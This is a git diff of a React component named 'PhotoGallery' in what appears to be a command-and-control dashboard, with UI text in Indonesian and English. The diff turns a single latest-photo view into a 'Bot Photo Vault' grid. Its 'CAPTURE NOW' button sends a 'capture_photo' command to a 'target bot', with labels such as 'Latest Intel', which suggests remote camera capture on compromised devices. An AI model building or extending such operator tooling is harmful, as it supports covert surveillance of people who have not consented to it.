@@ -1,11 +1,10 @@
 'use client';
 
 import { useEffect, useState } from 'react';
-import { Camera, RefreshCcw, Clock3, X } from 'lucide-react';
+import { Camera, RefreshCcw, Clock3, X, Image as ImageIcon, Download } from 'lucide-react';
 import { clsx } from 'clsx';
 import { twMerge } from 'tailwind-merge';
-import { onValue, ref } from 'firebase/database';
-import { database, FIREBASE_PATHS } from '@/lib/firebase';
+import { useImageCaptures } from '@/hooks/useFirebase';
 import { sendCommand } from '@/services/targetService';
 import { toast } from '@/lib/toast';
 
@@ -15,74 +14,33 @@ interface PhotoGalleryProps {
   targetId?: string;
 }
 
-interface PhotoCapture {
-  url?: string;
-  timestamp?: number;
-  [key: string]: any;
-}
-
 export default function PhotoGallery({ targetId }: PhotoGalleryProps) {
-  const [photo, setPhoto] = useState<PhotoCapture | null>(null);
-  const [loading, setLoading] = useState(true);
+  const { images, isLoading } = useImageCaptures(targetId);
   const [sending, setSending] = useState(false);
-  const [lightboxOpen, setLightboxOpen] = useState(false);
-
-  useEffect(() => {
-    if (!targetId) {
-      setPhoto(null);
-      setLoading(false);
-      return;
-    }
-
-    setLoading(true);
-    const photoRef = ref(database, `${FIREBASE_PATHS.PHOTOS}/${targetId}`);
-    const unsubscribe = onValue(photoRef, (snapshot) => {
-      const data = snapshot.val();
-      if (!data) {
-        setPhoto(null);
-      } else if (typeof data === 'string') {
-        setPhoto({ url: data, timestamp: undefined });
-      } else {
-        setPhoto(data);
-      }
-      setLoading(false);
-    });
-
-    return () => unsubscribe();
-  }, [targetId]);
+  const [selectedImage, setSelectedImage] = useState<string | null>(null);
 
   const handleCapture = async () => {
     if (!targetId) return;
-
     setSending(true);
     try {
       await sendCommand(targetId, 'capture_photo');
-      toast.success('Perintah capture photo terkirim.');
+      toast.success('Triggering camera on target bot...');
     } catch (error) {
-      toast.error('Gagal mengirim perintah capture photo.');
+      toast.error('Failed to send capture command.');
     } finally {
       setSending(false);
     }
   };
 
-  const formattedTime = photo?.timestamp
-    ? new Date(photo.timestamp).toLocaleString('id-ID', {
-        hour: '2-digit',
-        minute: '2-digit',
-        day: '2-digit',
-        month: '2-digit',
-      })
-    : 'Unknown';
-
   return (
     <>
       <section className="rounded-[32px] border border-white/10 bg-slate-950/85 p-6 shadow-2xl shadow-slate-950/30 backdrop-blur-xl">
-        <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
+        <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between mb-6">
           <div>
-            <p className="text-sm uppercase tracking-[0.3em] text-emerald-300/70">Latest Intel</p>
-            <h3 className="mt-2 text-2xl font-semibold text-white">Photo Gallery</h3>
-            <p className="max-w-sm text-sm text-slate-400">
-              Gambar terbaru dari target. Gunakan tombol refresh untuk memicu capture langsung dari bot.
+            <p className="text-sm uppercase tracking-[0.3em] text-cyan-400/70">Intelligence</p>
+            <h3 className="mt-2 text-2xl font-semibold text-white">Bot Photo Vault</h3>
+            <p className="max-w-sm text-[11px] text-slate-500 uppercase font-mono mt-1">
+              Data sinkronisasi otomatis dari Kei Bot Camera
             </p>
           </div>
 
@@ -91,70 +49,56 @@ export default function PhotoGallery({ targetId }: PhotoGalleryProps) {
             onClick={handleCapture}
             disabled={!targetId || sending}
             className={cn(
-              'inline-flex items-center justify-center gap-2 rounded-2xl border px-4 py-3 text-sm font-semibold transition',
-              'border-emerald-500/30 bg-emerald-500/10 text-emerald-200 hover:border-emerald-400/70 hover:bg-emerald-500/15',
+              'inline-flex items-center justify-center gap-2 rounded-2xl border px-5 py-2.5 text-xs font-bold uppercase transition-all',
+              'border-cyan-500/30 bg-cyan-500/10 text-cyan-200 hover:border-cyan-400/70 hover:bg-cyan-500/15',
               (!targetId || sending) && 'cursor-not-allowed opacity-50'
             )}
           >
-            <RefreshCcw size={16} />
-            {sending ? 'Memproses...' : 'Refresh / Capture'}
+            <Camera size={14} />
+            {sending ? 'REQUESTING...' : 'CAPTURE NOW'}
           </button>
         </div>
 
-        <div className="mt-6 overflow-hidden rounded-[28px] border border-white/10 bg-black/30 shadow-inner shadow-slate-950/20">
-          <div className="relative min-h-[300px] bg-slate-950/90 p-4">
-            {loading ? (
-              <div className="flex min-h-[300px] items-center justify-center text-slate-500">Memuat intel terbaru...</div>
-            ) : !targetId ? (
-              <div className="flex min-h-[300px] items-center justify-center text-slate-500">
-                Pilih target untuk menampilkan foto.
-              </div>
-            ) : !photo?.url ? (
-              <div className="flex min-h-[300px] flex-col items-center justify-center gap-3 text-slate-500">
-                <Camera size={36} />
-                <p>Tidak ada foto terakhir tersedia.</p>
-              </div>
-            ) : (
-              <div className="relative">
+        <div className="grid grid-cols-2 gap-3 max-h-[600px] overflow-y-auto pr-2 custom-scrollbar">
+          {isLoading ? (
+             [...Array(4)].map((_, i) => (
+               <div key={i} className="aspect-square rounded-2xl bg-white/5 animate-pulse border border-white/5" />
+             ))
+          ) : !targetId ? (
+            <div className="col-span-2 py-20 text-center text-slate-600 font-mono text-sm uppercase">Pilih target untuk akses vault</div>
+          ) : images.length === 0 ? (
+            <div className="col-span-2 py-20 text-center flex flex-col items-center gap-3">
+               <ImageIcon size={32} className="text-slate-700" />
+               <p className="text-slate-600 font-mono text-xs uppercase">Belum ada foto dari bot ini</p>
+            </div>
+          ) : (
+            images.map((img) => (
+              <div key={img.id} className="group relative aspect-square rounded-2xl overflow-hidden border border-white/10 bg-black/40">
                 <img
-                  src={photo.url}
-                  alt={`Latest capture for ${targetId}`}
-                  className="h-[320px] w-full object-contain cursor-pointer rounded-lg"
-                  onClick={() => setLightboxOpen(true)}
+                  src={img.url}
+                  alt="Bot capture"
+                  className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-110 cursor-zoom-in"
+                  onClick={() => setSelectedImage(img.url)}
                 />
-                <div className="pointer-events-none absolute inset-0 bg-gradient-to-t from-slate-950/85 via-slate-950/25 to-transparent" />
-                <div className="absolute bottom-4 left-4 flex items-center gap-2 rounded-2xl bg-slate-950/80 px-4 py-2 text-sm text-slate-100 shadow-lg shadow-black/30">
-                  <Clock3 size={16} />
-                  <span>{formattedTime}</span>
-                </div>
-                <div className="absolute top-4 left-4 rounded-2xl bg-emerald-500/10 px-3 py-1 text-xs uppercase tracking-[0.2em] text-emerald-300">
-                  {targetId}
+                <div className="absolute inset-x-0 bottom-0 p-3 bg-gradient-to-t from-black/80 to-transparent opacity-0 group-hover:opacity-100 transition-opacity">
+                   <p className="text-[10px] text-white font-mono">{new Date(img.timestamp).toLocaleString()}</p>
                 </div>
               </div>
-            )}
-          </div>
+            ))
+          )}
         </div>
       </section>
 
-      {/* Lightbox Modal */}
-      {lightboxOpen && photo?.url && (
+      {/* Lightbox */}
+      {selectedImage && (
         <div
-          className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm"
-          onClick={() => setLightboxOpen(false)}
+          className="fixed inset-0 z-[100] bg-black/95 backdrop-blur-md flex items-center justify-center p-4"
+          onClick={() => setSelectedImage(null)}
         >
-          <div className="relative max-h-[90vh] max-w-[90vw]">
-            <img
-              src={photo.url}
-              alt={`Latest capture for ${targetId}`}
-              className="max-h-full max-w-full object-contain"
-            />
-            <button
-              onClick={() => setLightboxOpen(false)}
-              className="absolute top-4 right-4 rounded-full bg-black/50 p-2 text-white hover:bg-black/70"
-            >
-              <X size={24} />
-            </button>
-          </div>
+          <button className="absolute top-6 right-6 text-white/50 hover:text-white transition-colors">
+            <X size={32} />
+          </button>
+          <img src={selectedImage} className="max-w-full max-h-full rounded-lg shadow-2xl border border-white/10" alt="Full view" />
         </div>
       )}
     </>
